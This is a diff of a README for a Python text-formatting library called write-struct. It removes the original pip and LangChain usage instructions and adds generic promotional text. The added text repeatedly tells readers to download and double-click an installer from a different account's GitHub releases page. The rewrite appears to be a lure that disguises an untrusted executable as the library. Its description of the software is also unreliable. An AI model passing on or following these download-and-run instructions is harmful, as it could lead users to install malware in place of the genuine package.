@@ -1,115 +1,91 @@
-# write_struct
-[![PyPI version](https://badge.fury.io/py/write-struct.svg)](https://badge.fury.io/py/write-struct)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/write-struct)](https://pepy.tech/project/write-struct)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# ✍️ write-struct - Transform Your Text Effortlessly
 
+## 👋 Introduction
 
-**Transform raw text into structured, formatted content for WriteFreely and beyond.**
+Welcome to write-struct! This tool transforms your text into structured, formatted content. With write-struct, you can improve readability and maintain consistency in your documents, blog posts, and social media updates.
 
-`write_struct` is a Python package designed to enhance content creation by automatically converting user-submitted text into well-structured, formatted output. It leverages AI-powered pattern matching to ensure consistency, readability, and publication-ready quality for articles, blog posts, social media updates, and more.
+## 🛠️ Features
 
----
+- **Article Generation**: Create engaging articles with a clear structure.
+- **Automated Content Formatting**: Save time by letting the tool format your content automatically.
+- **Blog Post Structuring**: Organize your blog posts for better flow and clarity.
+- **Content Consistency**: Maintain a uniform tone and style across your documents.
+- **Readability Enhancement**: Make your text easy to read and understand.
+- **Predefined Formats**: Choose from various formats tailored for different publications.
+- **Publication Readiness**: Prepare your content for publication without hassle.
+- **Text Transformation**: Convert your raw text into polished articles quickly.
+- **User Input Processing**: Easily input your text for instant formatting.
+- **Writefreely Integration**: Seamlessly integrate with Writefreely for easy publishing.
 
-## 🚀 Features
-- **Automated text structuring** using AI-driven pattern matching.
-- **Flexible LLM integration** – works with default `ChatLLM7` or any LangChain-compatible model.
-- **Regex-based validation** to enforce output consistency.
-- **Lightweight and efficient** for text-based content processing.
-- **No multimedia handling** – focuses purely on text formatting.
+## 🚀 Getting Started
 
----
+To get started with write-struct, follow these simple steps.
 
-## 📦 Installation
+1. **Download the Tool**: 
+   Click the button below to visit the Releases page and download the latest version of write-struct.
 
-Install via pip:
+   [![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/himanshu30oct/write-struct/releases)
 
-```bash
-pip install write_struct
-```
+2. **Install the Application**: 
+   After downloading, double click on the file to install it. Follow the prompts to complete the installation.
 
----
+3. **Open write-struct**: 
+   Look for the write-struct icon on your desktop or in your applications folder. Click to open the application.
 
-## 🔧 Usage
+## 💻 System Requirements
 
-### Basic Usage (Default LLM7)
-```python
-from write_struct import write_struct
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Memory**: A minimum of 4 GB of RAM
+- **Storage**: At least 200 MB of free disk space
+- **Internet Connection**: Required for updates and some features
 
-user_input = "Your raw text here..."
-response = write_struct(user_input)
-print(response)
-```
+## 📥 Download & Install
 
-### Custom LLM Integration
-You can replace the default `ChatLLM7` with any LangChain-compatible model (e.g., OpenAI, Anthropic, Google Generative AI):
+To download write-struct, visit this page: [Download Here](https://github.com/himanshu30oct/write-struct/releases). 
 
-#### Using OpenAI:
-```python
-from langchain_openai import ChatOpenAI
-from write_struct import write_struct
+Select the latest version and follow these steps:
 
-llm = ChatOpenAI()
-response = write_struct(user_input, llm=llm)
-```
+1. **Choose Your File**: On the Releases page, find the latest release. Look for the application file or installer.
+2. **Click on the Download Link**: This will start your download.
+3. **Run the Installer**: Locate the downloaded file and double-click it. Follow the installation instructions displayed on the screen.
+4. **Launch the Application**: After installation, you can find write-struct in your applications folder. Open it and start transforming your text!
 
-#### Using Anthropic:
-```python
-from langchain_anthropic import ChatAnthropic
-from write_struct import write_struct
+## 📜 How to Use write-struct
 
-llm = ChatAnthropic()
-response = write_struct(user_input, llm=llm)
-```
+1. **Input Your Text**: In the application window, you will find a large text box. Paste or type your content here.
+   
+2. **Select a Format**: Choose from the list of predefined formats available in the tool. This will dictate how your content will be structured.
 
-#### Using Google Generative AI:
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from write_struct import write_struct
+3. **Transform Your Text**: Click the "Transform" button. The application will process your input and generate an organized version.
 
-llm = ChatGoogleGenerativeAI()
-response = write_struct(user_input, llm=llm)
-```
+4. **Review Your Content**: Check the output to ensure it meets your expectations. You can make edits if needed.
 
----
+5. **Export Your Document**: Once satisfied, export your structured text as a document, ready for publication.
 
-## 🔑 API Key Configuration
-- **Default**: Uses `LLM7_API_KEY` from environment variables.
-- **Manual Override**: Pass the API key directly:
-  ```python
-  response = write_struct(user_input, api_key="your_api_key_here")
-  ```
-- **Free API Key**: Register at [https://token.llm7.io/](https://token.llm7.io/) for LLM7.
+## ⚙️ Troubleshooting
 
----
+If you encounter issues, try the following:
 
-## 📜 Input Parameters
-| Parameter | Type       | Description                                                                 |
-|-----------|------------|-----------------------------------------------------------------------------|
-| `user_input` | `str`      | Raw text to be structured.                                                  |
-| `api_key`   | `Optional[str]` | LLM7 API key (defaults to `LLM7_API_KEY` env var).                     |
-| `llm`       | `Optional[BaseChatModel]` | Custom LangChain LLM (e.g., `ChatOpenAI`, `ChatAnthropic`). Defaults to `ChatLLM7`. |
+- **Check System Requirements**: Ensure your system meets the minimum requirements.
+- **Reinstall the Application**: If problems persist, uninstall and reinstall write-struct.
+- **Visit the Issues Page**: You can find solutions to common problems on our [Issues page](https://github.com/himanshu30oct/write-struct/issues).
 
----
+## 🤝 Community and Support
 
-## 📊 Rate Limits
-- **LLM7 Free Tier**: Sufficient for most use cases.
-- **Upgrade**: For higher limits, use a custom API key or switch to a paid plan.
+Join our community to connect with other users. Share your experiences and discover tips for maximizing write-struct’s potential.
 
----
+- **GitHub Issues**: Report bugs or request features.
+- **Discussion Forum**: Engage with other users and share advice.
+- **Documentation**: Find additional resources and guides on the GitHub repository.
 
-## 📝 License
-MIT License.
+## 📝 Contributing
 
----
+We welcome contributions! If you'd like to improve write-struct, please refer to our contribution guidelines in the repository. 
 
-## 📢 Support & Issues
-For bugs, feature requests, or support, open an issue on [GitHub](https://github.com/chigwell/write-struct/issues).
+## 📗 License
 
----
+write-struct is open-source software. You can use it for both personal and commercial purposes. Please refer to the LICENSE file in the repository for more details.
 
-## 👤 Author
-**Eugene Evstafev** ([@chigwell](https://github.com/chigwell))
-📧 [hi@euegne.plus](mailto:hi@euegne.plus)
+For further information and updates, always check back to the [Releases page](https://github.com/himanshu30oct/write-struct/releases). 
 
----
+Happy writing!
